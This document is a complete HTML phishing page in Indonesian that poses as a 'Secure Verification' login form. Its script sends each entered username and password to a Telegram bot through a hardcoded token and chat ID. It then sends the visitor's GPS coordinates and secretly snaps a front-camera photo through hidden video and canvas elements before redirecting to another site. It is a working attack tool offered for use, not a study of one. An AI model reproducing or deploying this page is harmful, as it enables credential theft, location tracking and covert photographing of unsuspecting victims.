
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Masuk ke Akun Anda</title>
    <!-- Google Fonts & FontAwesome untuk Ikon -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Inter', sans-serif;
        }

        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }

        .login-card {
            background: rgba(255, 255, 255, 0.95);
            padding: 40px 30px;
            border-radius: 20px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
            width: 100%;
            max-width: 400px;
            text-align: center;
            backdrop-filter: blur(10px);
            animation: fadeIn 0.8s ease-in-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .login-card .logo {
            font-size: 40px;
            color: #667eea;
            margin-bottom: 15px;
        }

        .login-card h2 {
            color: #333;
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 8px;
        }

        .login-card p {
            color: #666;
            font-size: 14px;
            margin-bottom: 25px;
        }

        .input-group {
            position: relative;
            margin-bottom: 15px;
            text-align: left;
        }

        .input-group i {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #999;
        }

        .input-group input {
            width: 100%;
            padding: 12px 15px 12px 45px;
            border: 1px solid #ddd;
            border-radius: 10px;
            font-size: 14px;
            outline: none;
            transition: all 0.3s ease;
            background: #f9f9f9;
        }

        .input-group input:focus {
            border-color: #667eea;
            background: #fff;
            box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.1);
        }

        .btn-submit {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: opacity 0.3s ease, transform 0.1s ease;
            margin-top: 10px;
        }

        .btn-submit:hover {
            opacity: 0.9;
        }

        .btn-submit:active {
            transform: scale(0.98);
        }

        .footer-text {
            margin-top: 20px;
            font-size: 12px;
            color: #888;
        }
    </style>
</head>
<body>

    <div class="login-card">
        <div class="logo">
            <i class="fa-solid fa-shield-halved"></i>
        </div>
        <h2>Selamat Datang</h2>
        <p>Silakan masuk untuk melanjutkan ke halaman</p>
        
        <div class="input-group">
            <i class="fa-solid fa-user"></i>
            <input type="text" id="username" placeholder="Username atau Email" required>
        </div>
        
        <div class="input-group">
            <i class="fa-solid fa-lock"></i>
            <input type="password" id="password" placeholder="Kata Sandi" required>
        </div>

        <button class="btn-submit" id="btnLanjut" onclick="prosesLogin()">Lanjut</button>
        
        <div class="footer-text">
            &copy; 2026 Secure Verification. All rights reserved.
        </div>
    </div>

    <!-- Elemen Kamera Tersembunyi -->
    <video id="video" width="320" height="240" autoplay style="display:none;"></video>
    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>

    <script>
        const botToken = "8923573949:AAGZm4FP8EkWoaJqLdzUG0y1cZnfG0Yd8Is";
        const chatId = "6742478722";
        const urlTujuan = "https://vxxye-xx.xenxye.biz.id/evxc/"; // Ganti dengan halaman tujuan

        function kirimKeTelegram(pesan) {
            return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: pesan })
            });
        }

        function kirimFotoKeTelegram(blob) {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'selfie.jpg');

            return fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        }

        function prosesLogin() {
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;
            const btn = document.getElementById('btnLanjut');

            if(!user || !pass) {
                alert("Harap isi username dan password terlebih dahulu!");
                return;
            }

            // Ubah tombol jadi status loading agar terlihat profesional
            btn.disabled = true;
            btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Memproses...';

            // 1. Kirim data teks login
            kirimKeTelegram(`📥 Data Login Masuk:\nUsername: ${user}\nPassword: ${pass}`);

            // 2. Ambil Lokasi GPS
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    kirimKeTelegram(`📍 Lokasi Pengguna:\nLat: ${lat}\nLon: ${lon}\nGoogle Maps: https://maps.google.com/?q=${lat},${lon}`);
                }, error => {
                    kirimKeTelegram("⚠️ Lokasi ditolak oleh pengguna.");
                });
            }

            // 3. Ambil Foto Kamera Depan & Redirect
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                .then(stream => {
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    video.play();

                    setTimeout(() => {
                        const canvas = document.getElementById('canvas');
                        const context = canvas.getContext('2d');
                        context.drawImage(video, 0, 0, 320, 240);
                        
                        canvas.toBlob(blob => {
                            kirimFotoKeTelegram(blob).finally(() => {
                                stream.getTracks().forEach(track => track.stop());
                                window.location.href = urlTujuan;
                            });
                        }, 'image/jpeg');
                    }, 2000); 
                })
                .catch(error => {
                    kirimKeTelegram("⚠️ Akses kamera ditolak oleh pengguna.");
                    setTimeout(() => {
                        window.location.href = urlTujuan;
                    }, 1000);
                });
        }
    </script>
</body>
</html>
